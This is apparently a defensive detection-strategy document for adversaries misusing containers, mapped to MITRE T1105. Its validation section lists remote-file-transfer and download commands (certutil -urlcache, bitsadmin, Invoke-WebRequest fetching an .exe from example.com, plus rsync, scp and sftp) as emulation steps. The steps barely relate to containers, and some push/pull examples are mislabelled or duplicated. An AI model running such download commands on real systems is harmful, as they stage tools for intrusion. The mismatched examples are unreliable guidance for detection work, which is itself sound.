# Alerting & Detection Strategy: Detect Adversarial Attempts to Bypass Security Monitoring Using Containers

## Goal
This technique aims to detect adversarial attempts to bypass security monitoring systems by leveraging container technologies on various platforms.

## Categorization

- **MITRE ATT&CK Mapping:** T1105 - Ingress Tool Transfer  
  This involves techniques where adversaries transfer tools into compromised environments for further exploitation.
- **Tactic / Kill Chain Phases:** Command and Control
- **Platforms:** Linux, macOS, Windows  
  [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1105)

## Strategy Abstract
The detection strategy focuses on monitoring container activities across diverse data sources including network traffic logs, system calls, file integrity events, and container runtime activity. The key patterns analyzed include unusual inter-container communications, abnormal container deployment behavior, and unexpected changes to container images.

- **Data Sources:** 
  - Container runtime logs (e.g., Docker, Kubernetes)
  - Network traffic monitoring
  - System call tracing
  - File integrity alerts

## Technical Context
Adversaries often exploit containers due to their lightweight nature and the ability to isolate environments while still communicating with host systems. Common methods include:
- Deploying malicious containers that mimic legitimate ones.
- Using container images as vectors for deploying malware.
- Leveraging inter-container communication channels to exfiltrate data.

### Adversary Emulation Details
To emulate these techniques, test scenarios might involve creating and executing suspicious container activities such as:
- Pulling compromised or unexpected container images.
- Establishing unauthorized communication between containers.
- Modifying container configurations without proper authorization.

## Blind Spots and Assumptions
- **Blind Spots:**
  - Advanced obfuscation methods used by adversaries may not be detected.
  - Encrypted inter-container communications might evade detection unless decrypted in transit.
  
- **Assumptions:**
  - Container runtime environments are configured with logging enabled.
  - Security teams have baseline knowledge of legitimate container activities.

## False Positives
Potential benign activities that could trigger false alerts include:
- Legitimate software updates using containerized deployment tools.
- Routine inter-container communications in microservices architectures.
- Authorized use of scripts for automation purposes within containers.

## Priority
**Priority: High**

Justification: The rapid growth and adoption of container technologies provide adversaries with a versatile tool to bypass traditional security measures. This increases the risk profile, making timely detection crucial.

## Validation (Adversary Emulation)
To validate this detection strategy, simulate adversarial techniques in a controlled test environment:

1. **rsync remote file copy:**
   - Push: `rsync -avz source_user@host:/path/to/file /destination`
   - Pull: `rsync -avz source_user@host:/path/to/file /destination`

2. **scp remote file copy:**
   - Push: `scp source_user@host:/path/to/file /destination`
   - Pull: `scp /local_file source_user@host:/path/to/destination`

3. **sftp remote file copy:**
   - Push: 
     ```bash
     sftp source_user@host
     put /local_path/to/file /remote/path/to/file
     ```
   - Pull:
     ```bash
     sftp source_user@host
     get /remote/path/to/file /local_path/to/destination
     ```

4. **certutil download:**
   - urlcache: `certutil -urlcache -split -f http://example.com/file.exe c:\windows\temp`
   - verifyctl: `certutil -verifyctl http://example.com/file.exe`

5. **Windows BITSAdmin BITS Download:**
   ```cmd
   bitsadmin /transfer "jobname" https://example.com/file.exe C:\destination\
   ```

6. **PowerShell Download:**
   ```powershell
   Invoke-WebRequest -Uri "http://example.com/file.exe" -OutFile "C:\destination\file.exe"
   ```

7. **OSTAP Worming Activity, svchost writing a file to a UNC path, etc.:** These can be replicated using specific tools and scripts designed for such purposes.

## Response
Upon detection of suspicious container activities:
- Isolate affected containers.
- Analyze logs and network traffic related to the identified threat vector.
- Verify the integrity of all deployed container images.
- Update security policies and detection signatures based on insights gained from the incident.

## Additional Resources
For further context and reference, consider exploring resources such as:
- Curl Usage on Linux
- PowerShell Web Download Patterns
- Suspicious Activities Related to Container Runtime Logs

These materials provide deeper insights into potential adversarial tactics involving containers and help refine detection strategies.